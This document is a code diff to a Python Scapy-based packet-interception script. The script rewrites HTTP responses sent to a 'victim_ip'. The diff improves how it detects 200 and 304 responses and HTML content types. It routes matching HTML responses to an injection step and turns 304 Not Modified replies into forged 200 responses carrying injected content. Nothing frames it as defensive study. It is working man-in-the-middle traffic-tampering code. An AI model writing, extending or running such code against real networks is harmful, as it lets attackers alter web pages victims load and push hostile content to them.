@@ -147,6 +147,9 @@ def modify_packet(packet):
     src_ip = scapy_pkt.src
     dst_ip = scapy_pkt.dst
     
+    # Flag to track if we should process as HTML (defined at function level)
+    process_as_html = False
+    
     if scapy_pkt.haslayer(TCP):
         tcp_layer = scapy_pkt[TCP]
         
@@ -203,18 +206,26 @@ def modify_packet(packet):
             
             # Log response status and headers
             try:
-                lines = payload.split(b'\r\n')
-                first_line = lines[0].decode('utf-8', errors='ignore')
+                # Handle different line ending formats
+                if b'\r\n' in payload:
+                    lines = payload.split(b'\r\n')
+                elif b'\n' in payload:
+                    lines = payload.split(b'\n')
+                else:
+                    lines = [payload]
+                
+                first_line = lines[0].decode('utf-8', errors='ignore').strip()
                 logger.info(f"[HTTP-RESPONSE] Status: {first_line}")
                 
                 # Log first few headers for debugging
                 for i, line in enumerate(lines[1:6]):  # Show first 5 headers
                     if line:
-                        header_line = line.decode('utf-8', errors='ignore')
-                        logger.info(f"[HTTP-HEADER] {header_line}")
+                        header_line = line.decode('utf-8', errors='ignore').strip()
+                        if header_line:  # Skip empty lines
+                            logger.info(f"[HTTP-HEADER] {header_line}")
                 
                 # Handle 304 Not Modified responses
-                if "304 Not Modified" in first_line:
+                if "304" in first_line and "Not Modified" in first_line:
                     logger.warning(f"[HTTP-304] 🔄 Converting 304 Not Modified to 200 OK with injection")
                     
                     # Create a fake 200 response with injected content
@@ -273,20 +284,30 @@ def modify_packet(packet):
                     packet.accept()
                     return
                 
-                # Handle 200 OK responses with HTML content
-                if "200 OK" in first_line:
+                # Handle 200 responses - be more flexible with status line matching
+                elif "200" in first_line:
+                    logger.info(f"[HTTP-200] Detected 200 response, checking for HTML content...")
+                    
                     # Check if it's HTML content
                     has_html_content = False
+                    content_type_found = None
+                    
                     for line in lines:
-                        if b"content-type:" in line.lower() and b"text/html" in line.lower():
-                            has_html_content = True
-                            break
+                        line_str = line.decode('utf-8', errors='ignore').lower()
+                        if line_str.startswith('content-type:'):
+                            content_type_found = line_str
+                            if 'text/html' in line_str:
+                                has_html_content = True
+                                break
+                    
+                    logger.info(f"[HTTP-200] Content-Type search result: {content_type_found}")
+                    logger.info(f"[HTTP-200] HTML content detected: {has_html_content}")
                     
                     if has_html_content:
-                        logger.warning(f"[HTTP-200] 🎯 Found 200 OK HTML response - processing for injection")
-                        # Continue to normal HTML processing below with complete payload
+                        logger.warning(f"[HTTP-200] 🎯 Found 200 HTML response - processing for injection")
+                        process_as_html = True  # Set flag to process as HTML
                     else:
-                        logger.info(f"[HTTP-200] 200 OK but not HTML content - skipping injection")
+                        logger.info(f"[HTTP-200] 200 response but not HTML content - skipping injection")
                         packet.accept()
                         return
                 else:
@@ -301,20 +322,27 @@ def modify_packet(packet):
                 logger.error(f"[HTTP-DEBUG] Payload preview: {payload_preview}")
                 packet.accept()
                 return
+            
+            # If we're processing as HTML, skip the old detection logic
+            if process_as_html:
+                pass  # Continue to HTML processing below
+            else:
+                packet.accept()
+                return
     
-    # Handle fragments from ongoing streams
+    # If we detected return traffic but no HTTP response, show debug info
     elif tcp_layer.sport == 80 and dst_ip == victim_ip:
-        # This might be a continuation of an HTTP response
         # No stream buffering, just accept and let modify_packet handle it
         logger.info(f"[DEBUG-RESPONSE] Return traffic from {src_ip}:80 but no HTTP headers detected")
         payload_preview = payload[:100].decode('utf-8', errors='ignore')
         logger.info(f"[DEBUG-PAYLOAD] First 100 bytes: {repr(payload_preview)}")
 
-    # Process regular HTML responses (original logic)
-    if not (b"HTTP/" in payload and b"Content-Type: text/html" in payload):
-        # Log why we're not processing this packet
-        if b"HTTP/" in payload:
-            # It's HTTP but not HTML
+    # Process HTML responses (for 200 OK responses that passed validation above)
+    # For 200 responses, we've already validated HTML content above
+    # This section handles other HTTP responses or validates non-200 responses
+    if not process_as_html and not (b"HTTP/" in payload and (b"Content-Type: text/html" in payload or b"content-type: text/html" in payload)):
+        # Only log skip message for non-200 responses to avoid confusion
+        if b"HTTP/" in payload and "200" not in payload.decode('utf-8', errors='ignore')[:100]:
             content_type = None
             try:
                 headers = payload.split(b'\r\n\r\n')[0].decode('utf-8', errors='ignore')
